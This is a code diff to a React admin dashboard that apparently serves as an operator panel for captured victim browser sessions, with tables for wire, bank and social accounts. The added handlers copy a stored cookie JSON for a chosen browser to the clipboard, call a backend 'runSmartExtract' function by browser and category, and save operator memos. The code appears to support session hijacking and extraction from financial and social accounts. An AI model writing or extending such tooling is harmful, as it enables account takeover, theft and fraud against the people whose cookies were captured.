@@ -11,7 +11,7 @@ import { WireTable } from '../components/admin/dashboard/wire/WireTable';
 import { BankTable } from '../components/admin/dashboard/bank/BankTable';
 import { SocialTable } from '../components/admin/dashboard/social/SocialTable';
 import LoadingSpinner from '../components/LoadingSpinner';
-import { authApi } from '../../utils/auth';
+import { authApi, securedApi } from '../../utils/auth';
 import { usePersistedState } from '../hooks/usePersistedState';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import { faSync, faChartLine, faDownload, faSearch } from '@fortawesome/free-solid-svg-icons';
@@ -285,7 +285,17 @@ export default function Dashboard() {
   const handleGetCookie = async (id: string) => {
     setLoading(true);
     try {
-      // Implement get cookie functionality
+      const item = hubData.find((row: any) => row.id === id || row.browserId === id);
+      const cookieData = typeof item?.cookieJSON === 'string'
+        ? item.cookieJSON
+        : item?.cookieJSON
+          ? JSON.stringify(item.cookieJSON)
+          : '';
+      if (cookieData) {
+        await navigator.clipboard.writeText(cookieData);
+      } else {
+        console.warn('No cookie data found for item');
+      }
     } catch (error) {
       console.error('Error getting cookie:', error);
     } finally {
@@ -300,7 +310,15 @@ export default function Dashboard() {
   const handleExtract = async (id: string) => {
     setLoading(true);
     try {
-      // Implement extract functionality based on category
+      const item = hubData.find((row: any) => row.id === id || row.browserId === id);
+      const category = (item?.category || 'WIRE') as 'WIRE' | 'BANK' | 'SOCIAL';
+      const browserId = item?.browserId || item?.submissionId || id;
+
+      await securedApi.callBackendFunction({
+        functionName: 'runSmartExtract',
+        browserId,
+        category,
+      });
     } catch (error) {
       console.error('Error extracting:', error);
     } finally {
@@ -340,7 +358,15 @@ export default function Dashboard() {
 
   const handleMemoSave = async (id: string, text: string) => {
     try {
-      // Implement memo save functionality
+      const item = hubData.find((row: any) => row.id === id || row.browserId === id);
+      const browserId = item?.browserId || item?.submissionId || id;
+
+      await securedApi.callBackendFunction({
+        functionName: 'saveMemo',
+        browserId,
+        memo: text,
+      });
+
       setMemoInput(null);
     } catch (error) {
       console.error('Error saving memo:', error);
